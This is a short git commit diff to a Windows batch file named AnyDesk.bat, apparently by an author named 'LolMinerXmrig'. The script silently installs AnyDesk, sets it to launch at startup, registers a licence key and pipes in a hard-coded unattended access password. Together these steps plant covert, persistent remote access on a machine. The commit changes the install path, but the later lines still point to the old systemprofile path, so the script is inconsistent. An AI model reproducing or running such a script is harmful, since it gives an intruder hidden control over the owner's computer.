b44144e5f9a9396c41916a5b5e87d04dd2cd2bf4
LolMinerXmrig <108659226+lolminerxmrig@users.noreply.github.com>
2024-03-09 19:22:56 +0330

    Update AnyDesk.bat

--- AnyDesk.bat
+++ AnyDesk.bat
@@ -1,4 +1,4 @@
 @echo off 
-AnyDesk.exe --install "C:\Windows\system32\config\systemprofile\" --start-with-win --silent --create-shortcuts --create-desktop-icon 
+AnyDesk.exe --install "C:\Program Files (x86)\AnyDesk" --start-with-win --silent --create-shortcuts --create-desktop-icon 
 echo licence_keyABC | "C:\Windows\system32\config\systemprofile\AnyDesk.exe" --register-licence 
 echo password123 | "C:\Windows\system32\config\systemprofile\AnyDesk.exe" --set-password
